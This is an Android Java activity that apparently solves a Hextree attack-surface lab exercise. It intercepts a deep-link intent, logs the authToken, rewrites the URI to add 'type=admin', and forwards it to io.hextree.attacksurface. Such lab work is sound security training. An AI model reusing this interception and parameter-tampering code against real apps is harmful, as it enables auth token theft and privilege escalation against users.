package com.example.practicapp;

import android.app.PendingIntent;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivityHextree extends AppCompatActivity {
    private Uri maliciousUri;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        TextView t1 = findViewById(R.id.main_text);
        Button b1 = findViewById(R.id.intent_button);
        Intent intent = getIntent();
        Uri data = intent.getData();
        if (data != null) {

            String authToken = data.getQueryParameter("authToken");
            String authChallenge = data.getQueryParameter("authChallenge");
            Log.i(
                    "FaTest","authToken"+authToken
            );

            // modifying user type to admin, Our app is performing MITM
            maliciousUri = Uri.parse(
                    data.getScheme() + "://" +
                            data.getHost() +
                            data.getPath() +
                            "?type=admin"
                            + "&authToken=" + authToken
                            + "&authChallenge=" + authChallenge
            );


        }


        b1.setOnClickListener(v -> {

            if(maliciousUri == null){
                Toast.makeText(this,"No intercepted URI",Toast.LENGTH_SHORT).show();
                return;
            }
            Log.i("FaTest",maliciousUri.toString());
            Intent forwardIntent = new Intent(Intent.ACTION_VIEW, maliciousUri);
            // so it won't be handled by our own app again implicitly.
            forwardIntent.setPackage("io.hextree.attacksurface");

            startActivity(forwardIntent);


        });
    }

}
